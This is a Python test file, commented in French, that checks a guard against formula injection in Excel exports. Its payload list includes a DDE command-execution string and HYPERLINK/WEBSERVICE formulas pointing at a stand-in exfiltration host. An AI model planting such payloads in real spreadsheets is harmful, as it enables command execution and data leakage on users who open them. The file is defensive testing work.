"""Tests de la protection contre l'injection de formule dans les classeurs.

Exécutable sans pytest :  .venv/bin/python3 -B tests/test_xlsxsafe.py

Le drapeau `-B` n'est pas décoratif — voir l'en-tête de `tests/test_asil.py`.

Ces tests ne se contentent pas de vérifier une fonction : ils **écrivent un
classeur, le relisent et regardent le type réel des cellules**. C'est le seul
niveau qui prouve quelque chose ici — une charge neutralisée en mémoire mais
réécrite en formule à la sauvegarde n'aurait rien réglé.
"""

import sys
from io import BytesIO
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))

import openpyxl  # noqa: E402
from openpyxl import Workbook  # noqa: E402

from xlsxsafe import harden, looks_like_formula  # noqa: E402

# Charges écrites à la main, une par mécanisme réel.
PAYLOADS = [
    "=cmd|'/c calc'!A1",                       # exécution via DDE
    "=HYPERLINK(\"http://exfil.invalid\",\"ok\")",  # exfiltration au clic
    "=WEBSERVICE(\"http://exfil.invalid\")",   # exfiltration sans clic
    "@SUM(1+1)*cmd",                           # amorce @
    "+1+1",                                    # amorce +
    "-1+1",                                    # amorce -
    "\t=1+1",                                  # tabulation en tête, Excel l'ignore
    "  =1+1",                                  # espaces en tête
    "\r\n=1+1",                                # retour chariot en tête
]

INNOCENTS = [
    "Perte inattendue du couple de freinage",
    "salesforceClientCredentials.ts",
    "CRITIQUE",
    "Descente sur autoroute — chaussée mouillée",
    "a=b",           # le = n'est pas en tête
    "n° 3 (=environ)",
]


def _roundtrip(values, apply_harden=True):
    """Écrit les valeurs, durcit ou non, sauvegarde, relit. Rend les cellules."""
    workbook = Workbook()
    sheet = workbook.active
    for value in values:
        sheet.append([value])
    count = harden(workbook) if apply_harden else 0
    buffer = BytesIO()
    workbook.save(buffer)
    reread = openpyxl.load_workbook(BytesIO(buffer.getvalue()))
    return list(reread.active.iter_rows(min_col=1, max_col=1)), count


def test_detection_reference():
    for payload in PAYLOADS:
        assert looks_like_formula(payload), f"{payload!r} aurait dû être repéré"
    for innocent in INNOCENTS:
        assert not looks_like_formula(innocent), f"{innocent!r} n'est pas une formule"


def test_non_strings_are_left_alone():
    """Un entier, une date ou un booléen ne peut pas porter de formule."""
    for value in (0, 42, -7, 3.14, True, False, None):
        assert looks_like_formula(value) is False, f"{value!r} n'est pas une chaîne"


def test_payloads_really_land_as_formulas_without_the_guard():
    """Contre-épreuve : sans durcissement, la faille existe bel et bien.

    Un test de protection qui passerait aussi sans la protection ne prouverait
    rien. Celui-ci échoue si le problème disparaît tout seul.
    """
    rows, _ = _roundtrip(["=cmd|'/c calc'!A1"], apply_harden=False)
    assert rows[0][0].data_type == "f", "sans le garde-fou, la cellule devrait être une formule"


def test_no_formula_survives_a_roundtrip():
    """Le cœur du sujet : après sauvegarde et relecture, plus aucune formule."""
    rows, count = _roundtrip(PAYLOADS)
    assert count == len(PAYLOADS), f"{count} cellules neutralisées sur {len(PAYLOADS)}"
    for (cell,), payload in zip(rows, PAYLOADS):
        assert cell.data_type != "f", f"{payload!r} est ressorti en formule"


def test_content_is_preserved_exactly():
    """Un rapport doit dire ce qui a été détecté, au caractère près.

    Pas d'apostrophe ajoutée, pas de caractère escamoté : l'analyste lit la
    charge telle qu'elle a été trouvée, elle est seulement inerte.
    """
    rows, _ = _roundtrip(PAYLOADS)
    for (cell,), payload in zip(rows, PAYLOADS):
        assert cell.value == payload, f"contenu altéré : {cell.value!r} au lieu de {payload!r}"


def test_innocent_cells_are_untouched():
    rows, count = _roundtrip(INNOCENTS)
    assert count == 0, "aucune cellule innocente ne devait être touchée"
    for (cell,), innocent in zip(rows, INNOCENTS):
        assert cell.value == innocent


def test_harden_walks_every_sheet():
    """Le balayage doit couvrir tout le classeur, pas seulement la feuille active."""
    workbook = Workbook()
    workbook.active.append(["innocent"])
    for name in ("Détections", "Couverture", "Limites"):
        workbook.create_sheet(name).append(["=1+1"])
    assert harden(workbook) == 3


def test_harden_is_idempotent():
    """Rappeler le durcissement ne doit rien casser ni rien recompter à tort."""
    workbook = Workbook()
    workbook.active.append(["=1+1"])
    first = harden(workbook)
    second = harden(workbook)
    assert first == 1
    # La cellule est déjà en texte, mais sa valeur reste formule-like : on la
    # recompte. L'important est qu'elle ne redevienne jamais une formule.
    assert workbook.active["A1"].data_type == "s"
    assert second == 1


def test_real_exports_are_clean():
    """Les deux exports en production ne doivent plus produire de formule.

    C'est le test qui compte : il emprunte le vrai chemin de code, pas une
    reconstitution.
    """
    from datetime import datetime, timezone
    from types import SimpleNamespace

    from safetyscope.analysis import build_analysis
    from safetyscope.report import build_excel as build_hara
    from sentinelscan.report import build_excel as build_scan
    from sentinelscan.scanner import Finding, ScanResult

    charge = "=cmd|'/c calc'!A1"

    hara = build_hara(build_analysis(charge, [SimpleNamespace(
        malfunction=charge, situation=charge, severity=3, exposure=4, controllability=3)]))

    # Sur SentinelScan, la charge vient de GitHub — donc d'un tiers.
    now = datetime.now(timezone.utc)
    scan = build_scan(ScanResult(
        keywords=["acme"], started_at=now, finished_at=now,
        findings=[Finding(criticality="CRITIQUE", detection=charge, repo=charge,
                          owner=charge, path=charge, url="https://example.invalid/x",
                          keyword="acme")],
        errors=[charge], incomplete_queries=[charge], queries_run=1, queries_total=1))

    for nom, blob in (("SafetyScope", hara), ("SentinelScan", scan)):
        workbook = openpyxl.load_workbook(BytesIO(blob))
        formules = [
            f"{sheet.title}!{cell.coordinate}"
            for sheet in workbook.worksheets
            for row in sheet.iter_rows()
            for cell in row
            if cell.data_type == "f"
        ]
        assert not formules, f"{nom} produit encore des formules : {formules}"


def main() -> int:
    tests = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    failures = 0
    for test in tests:
        try:
            test()
            print(f"  ok    {test.__name__}")
        except AssertionError as exc:
            failures += 1
            print(f"  ÉCHEC {test.__name__} : {exc}")
    print(f"\n{len(tests) - failures}/{len(tests)} tests passés")
    return 1 if failures else 0


if __name__ == "__main__":
    raise SystemExit(main())
